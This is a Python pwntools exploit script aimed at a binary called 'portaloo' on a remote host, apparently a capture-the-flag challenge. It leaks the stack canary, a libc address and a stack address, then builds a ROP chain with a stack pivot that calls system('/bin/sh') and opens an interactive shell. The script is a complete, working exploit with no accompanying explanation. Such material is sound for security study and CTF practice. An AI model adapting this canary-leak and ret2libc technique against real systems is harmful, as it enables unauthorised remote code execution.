from pwn import *

context.binary = binary = ELF('./portaloo', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)

p = remote('94.237.48.41',46437)

p.sendlineafter(b'> ', b'5')
p.sendlineafter(b'> ', b'a'*72)

p.recvuntil(b'a'*72+b'\n')
canary = u64(b'\x00' + p.recv(7))
info(f'Canary: {hex(canary)}')

r = ROP(binary)

rop1 = b'a'*72
rop1 += p64(canary)
rop1 += b'b'*8
rop1 += p64(r.find_gadget(['ret'])[0])
rop1 += p64(binary.symbols.main)

p.sendlineafter(b': ', rop1)

p.sendlineafter(b'> ', b'5')
p.sendlineafter(b'> ', b'a'*7)

p.recvuntil(b'a'*7+b'\n')
libc_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
libc.address = libc_leak - 0x80faa
info(f'LIBC Leak: {hex(libc_leak)}')
info(f'LIBC Base: {hex(libc.address)}')

p.sendlineafter(b': ', rop1)

p.sendlineafter(b'> ', b'5')
p.sendlineafter(b'> ', b'a'*39)
p.recvuntil(b'a'*39+b'\n')
stack_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
stack_buf = stack_leak - 0x50
info(f'Stack leak: {hex(stack_leak)}')
info(f'Stack buffer: {hex(stack_buf)}')

r2 = ROP(libc)
leave_ret = p64(r2.find_gadget(['leave','ret'])[0])
pop_rdi = p64(r2.find_gadget(['pop rdi', 'ret'])[0])
ret = p64(r2.find_gadget(['ret'])[0])

rop2 = p64(stack_buf)
rop2 += pop_rdi
rop2 += p64(next(libc.search(b'/bin/sh\x00')))
rop2 += ret
rop2 += p64(libc.symbols.system)
rop2 += b'a'*32
rop2 += p64(canary)
rop2 += p64(stack_buf)
rop2 += leave_ret

p.sendlineafter(b': ', rop2)

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
